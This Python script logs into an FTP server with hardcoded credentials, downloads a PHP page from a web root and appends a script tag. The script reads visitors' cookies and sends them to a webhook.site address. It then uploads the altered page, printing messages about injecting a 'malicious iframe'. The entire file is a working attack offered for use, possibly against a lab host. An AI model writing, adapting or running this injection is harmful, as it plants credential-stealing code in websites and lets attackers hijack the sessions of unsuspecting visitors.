import ftplib
def injectPage(ftp:ftplib.FTP, page, redirect):
    temp_filename = page + '.tmp'
    with open(temp_filename, 'wb') as temp_file:
        ftp.retrbinary('RETR ' + page, temp_file.write)
    print("[+] Download page: " + page)
    redirect_bytes = redirect.encode('utf-8')
    with open(temp_filename, 'ab') as temp_file:
        temp_file.write(redirect_bytes)
    print('[+] Inject Malicious Iframe on: ' + page)
    with open(temp_filename, 'rb') as temp_file:
        ftp.storbinary("STOR " + page, temp_file)
    print("[+] Upload inject page: " + page)

host = '192.168.255.130'
port = 21 
username = 'client1' 
pwd = 'client1'
try:
    ftp=ftplib.FTP_TLS(timeout = 30) 
    ftp.connect(host, port) 
    ftp.auth()
    print(f"Connected to {host}")
    ftp.login(username,pwd) 
    ftp.prot_p() 
except Exception as e:
    print(e) 

ftp.cwd("/opt/lampp/htdocs/includes/") 
redirect = "<script>const cookies = document.cookie;const url = `https://webhook.site/ca18b48e-99ba-43e0-8376-d3261af9e983?${cookies}`;fetch(url, {method: 'GET'}).then(response => {}).catch(error =>{});</script>"
injectPage(ftp,'index.php',redirect)
